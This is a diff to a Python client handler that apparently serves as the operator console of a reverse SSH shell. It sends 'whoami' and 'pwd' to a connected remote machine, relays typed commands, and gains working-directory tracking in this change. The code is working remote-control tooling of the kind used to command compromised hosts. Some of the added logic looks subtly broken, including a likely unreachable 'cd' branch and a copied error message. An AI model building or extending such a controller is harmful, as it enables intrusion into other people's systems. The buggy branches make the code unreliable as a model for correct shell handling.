@@ -58,10 +58,17 @@ def client_handler(client_socket):
         else:
             print("[*] SSH Client Authenticated")
             username = ""
+            wd = ""
             try:
                 ssh_channel.send("whoami")
                 username = ssh_channel.recv(1024).decode('utf-8').replace('\n','')
                 print(f"[+] Connected as : {username}")
+            except:
+                print("[!] Error while retrieving username")
+            try:
+                ssh_channel.send("pwd")
+                wd = ssh_channel.recv(1024).decode('utf-8').replace('\n','')
+                print(f"[+] Working directory : {wd}")
             except:
                 print("[!] Error while retrieving username")
             #ssh channel is established. We can start the shell
@@ -70,7 +77,7 @@ def client_handler(client_socket):
                 try:
                     
                     
-                    command = input(f"<{username}:#> ").rstrip()
+                    command = input(f"<{username}:{wd}#> ").rstrip()
                     if len(command):
                         if command != "exit":
                             ssh_channel.send(command)
@@ -79,6 +86,12 @@ def client_handler(client_socket):
                             ssh_channel.send(command)
                             username = ssh_channel.recv(1024).decode('utf-8').replace('\n','')
                             print(username + '\n')
+                        elif "cd " in command:
+                            ssh_channel.send(command)
+                            wd = ssh_channel.recv(1024).decode('utf-8').replace('\n','')
+                            if not "null" in wd:
+                                wd = command.replace("cd ","")
+                            print(wd + '\n')
                         else:
                             print("[*] Exiting")
                             try:
